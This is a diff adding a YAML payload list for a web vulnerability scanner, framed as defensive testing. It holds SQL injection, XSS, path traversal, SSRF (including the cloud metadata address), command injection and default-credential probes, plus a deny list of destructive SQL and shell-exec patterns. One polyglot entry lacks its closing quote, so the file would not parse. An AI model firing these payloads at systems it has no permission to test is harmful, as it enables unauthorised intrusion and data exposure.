@@ -1,0 +1,211 @@
+# Web Vulnerability Scanner - Test Payloads
+# ⚠️ EDUCATIONAL & DEFENSIVE USE ONLY ⚠️
+# These payloads are SAFE and designed for testing your OWN applications
+# DO NOT use against systems you don't own or have explicit permission to test
+
+sql_injection:
+  # Basic SQL Injection Tests (SAFE, non-destructive)
+  basic:
+    - "'"
+    - "'"
+    - '"'
+    - ";"
+    - "' OR '1'='1"
+    - '" OR "1"="1'
+    - "1' OR '1'='1'"
+    - "admin'--"
+    - "admin'/*"
+    - "' OR 1=1--"
+    - '" OR 1=1--'
+    - "' UNION SELECT NULL--"
+    - "1' ORDER BY 1--"
+    - "1' ORDER BY 2--"
+    - "1' AND 1=1--"
+    - "1' AND 1=2--"
+
+  # Time-based detection (SAFE)
+  time_based:
+    - "' AND SLEEP(5)--"
+    - '" AND SLEEP(5)--'
+    - "1' AND SLEEP(5)--"
+    - "1; WAITFOR DELAY '00:00:05'--"
+
+  # Boolean-based detection (SAFE)
+  boolean_based:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "1' AND 1=1--"
+    - "1' AND 1=2--"
+
+xss:
+  # Reflected XSS Tests (SAFE payloads)
+  reflected:
+    - "<script>alert('XSS')</script>"
+    - "<script>alert(String.fromCharCode(88,83,83))</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    - "<body onload=alert('XSS')>"
+    - "<input onfocus=alert('XSS') autofocus>"
+    - "<select onfocus=alert('XSS') autofocus>"
+    - "<textarea onfocus=alert('XSS') autofocus>"
+    - "'><script>alert('XSS')</script>"
+    - "\"><script>alert('XSS')</script>"
+    - "<script>alert(document.cookie)</script>"
+    - "<script>alert(document.domain)</script>"
+    - "javascript:alert('XSS')"
+    - "<iframe src=\"javascript:alert('XSS')\">"
+
+  # Stored XSS Tests
+  stored:
+    - "<script>alert('Stored XSS')</script>"
+    - "<img src=x onerror=alert('Stored')>"
+    - "<svg onload=alert('Stored')>"
+
+  # DOM-based XSS
+  dom_based:
+    - "#<script>alert('DOM XSS')</script>"
+    - "?param=<script>alert('DOM XSS')</script>"
+
+  # Polyglot XSS (works in multiple contexts)
+  polyglot:
+    - "javascript://%250Aalert(1)//?param=value"
+    - "<script>alert(1)</script><svg onload=alert(1)>
+
+path_traversal:
+  # Path Traversal Tests (SAFE, read-only)
+  basic:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    - "....//....//....//etc/passwd"
+    - "%2e%2e%2fetc%2fpasswd"
+    - "%252e%252e%252fetc%252fpasswd"
+    - "..%252f..%252f..%252fetc%252fpasswd"
+    - "....////....////....////etc/passwd"
+    - "..%0d..%0a../win.ini"
+
+ssrf:
+  # Server-Side Request Forgery Tests (SAFE)
+  basic:
+    - "http://127.0.0.1"
+    - "http://localhost"
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://192.168.1.1"
+    - "file:///etc/passwd"
+    - "http://[::1]"
+    - "http://2130706433"  # 127.0.0.1 in decimal
+
+command_injection:
+  # Command Injection Tests (SAFE, read-only)
+  basic:
+    - "; ls"
+    - "| ls"
+    - "&& ls"
+    - "|| ls"
+    - "; cat /etc/passwd"
+    - "| cat /etc/passwd"
+    - "`whoami`"
+    - "$(whoami)"
+    - "; id"
+    - "| id"
+    - "&& id"
+    - "|| id"
+
+authentication:
+  # Authentication Testing (SAFE)
+  weak_credentials:
+    - username: "admin"
+      password: "admin"
+    - username: "admin"
+      password: "password"
+    - username: "admin"
+      password: "123456"
+    - username: "root"
+      password: "root"
+    - username: "test"
+      password: "test"
+
+  session_fixation:
+    - "SESSIONID=fixed"
+    - "PHPSESSID=fixed"
+    - "JSESSIONID=fixed"
+    - "ASPSESSIONID=fixed"
+
+security_misconfig:
+  # Security Misconfiguration Tests
+  default_pages:
+    - "/admin"
+    - "/administrator"
+    - "/wp-admin"
+    - "/console"
+    - "/dashboard"
+    - "/manager"
+    - "/phpmyadmin"
+    - "/mysql"
+    - "/test"
+    - "/debug"
+    - "/.git"
+    - "/.env"
+    - "/config.php"
+    - "/web.config"
+    - "/.DS_Store"
+
+  exposed_files:
+    - "/robots.txt"
+    - "/.htaccess"
+    - "/.gitignore"
+    - "/sitemap.xml"
+    - "/crossdomain.xml"
+    - "/WEB-INF/web.xml"
+
+  headers:
+    - "X-Frame-Options"
+    - "X-Content-Type-Options"
+    - "Strict-Transport-Security"
+    - "Content-Security-Policy"
+    - "X-XSS-Protection"
+    - "Referrer-Policy"
+
+information_disclosure:
+  # Information Disclosure Tests
+  error_messages:
+    - "'"
+    - '"'
+    - "<invalid>"
+    - "''"
+
+  verbose_errors:
+    - "/nonexistent-page-12345"
+    - "/?debug=true"
+    - "/?debug=1"
+    - "/?verbose=true"
+
+# Rate Limiting Configuration
+rate_limiting:
+  max_requests_per_second: 5
+  delay_between_requests: 0.2
+  max_retries: 3
+  timeout: 30
+
+# Excluded Patterns (to avoid damaging actions)
+excluded_patterns:
+  - "DROP TABLE"
+  - "DELETE FROM"
+  - "TRUNCATE"
+  - "UPDATE.*SET"
+  - "INSERT INTO"
+  - "exec("
+  - "eval("
+  - "system("
+  - "shell_exec("
+  - "passthru("
+  - "DROP.*DATABASE"
+  - "ALTER.*TABLE"
+  - "CREATE.*TABLE"
+
+# Safe Scanning Mode
+safe_mode:
+  enabled: true
+  read_only: true
+  no_modification: true
+  respect_robots_txt: true
+  follow_redirects: true
